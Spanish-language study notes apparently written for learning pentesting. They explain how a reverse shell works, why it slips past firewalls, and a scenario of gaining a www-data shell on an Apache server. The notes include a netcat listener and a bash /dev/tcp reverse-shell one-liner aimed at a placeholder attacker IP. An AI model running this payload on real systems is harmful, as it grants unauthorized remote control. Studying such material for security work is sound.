> En una **reverse shell**, la máquina víctima inicia la conexión hacia el atacante.

Es decir:
`Víctima  ───────►  Atacante         (conecta)`
El atacante pone un listener y espera que la víctima se conecte.

---
## 🔁 Flujo técnico

1. El atacante abre un puerto en escucha.    
2. Se ejecuta un payload en la víctima. 
3. La víctima crea una conexión saliente hacia el atacante.
4. Se redirige stdin/stdout/stderr hacia el socket.
5. El atacante obtiene una shell interactiva.

---
## 🧠 ¿Por qué se usa tanto?

Porque suele evadir mejor firewalls.
Normalmente:
- Los firewalls bloquean conexiones entrantes.
- Pero permiten conexiones salientes.
La reverse shell aprovecha eso.

---
## 🛠 Ejemplo conceptual

### En atacante:
`nc -lvnp 4444`
### En víctima:
`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`

La víctima abre la conexión hacia el atacante.

---
## ⚖️ Ventajas

✔️ Funciona detrás de NAT  
✔️ Más difícil de bloquear  
✔️ Ideal para acceso inicial

## ❌ Desventajas

❌ Necesita que el atacante esté escuchando  
❌ Puede ser detectada por monitoreo de conexiones salientes

---
## Ejemplo practico

- Tenemos una maquina **Atacante** y una maquina **Victima**.
- La **Victima** esta corriendo un servidor de **Apache2** por el puerto 80.
- La **Victima** que ejecuta ese servidor **Apache2** es un usuario, puede ser **root**, universoparalelo, etc, tiene un nombre.
- En un servicio web suele ser, el nombre, **www-data**.
- El **Atacante** quiere ganar acceso a ese servidor y obtener una consola al fin y al cabo.
- Entonces debe encontrar una forma de que el servidor le de una consola con la cual ejecutar comandos como usuario **www-data**.
- Este tipo de ataque es una **Reverse shell**.